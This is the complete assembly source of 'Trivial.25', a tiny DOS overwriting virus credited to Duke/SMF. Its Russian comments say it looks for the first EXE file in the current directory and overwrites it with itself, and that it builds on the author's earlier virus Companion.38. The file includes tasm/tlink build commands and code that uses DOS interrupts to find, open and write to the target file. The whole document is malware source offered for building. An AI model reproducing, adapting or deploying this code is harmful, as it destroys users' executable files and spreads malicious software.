; Trivial.25 (c) by Duke/SMF
; Если в текущем каталоге есть EXE-файл (первый, если их много),
; то перезапишем его. Написано по стопам моего вируса Companion.38 .
; tasm tr_25.asm /m
; tlink tr_25.obj /t

       .model tiny
       .code
       org  100h
start:
maska  db   '*.e*'
       mov  ah,4eh       ; ищем
       call new
new:
       mov  dx,si
       int  21h

       mov  ax,3D01h     ; открываем
       mov  dx,9eh
       int  21h

       xchg bx,ax
       mov  ah,40h       ; пишемся
       ret

end start
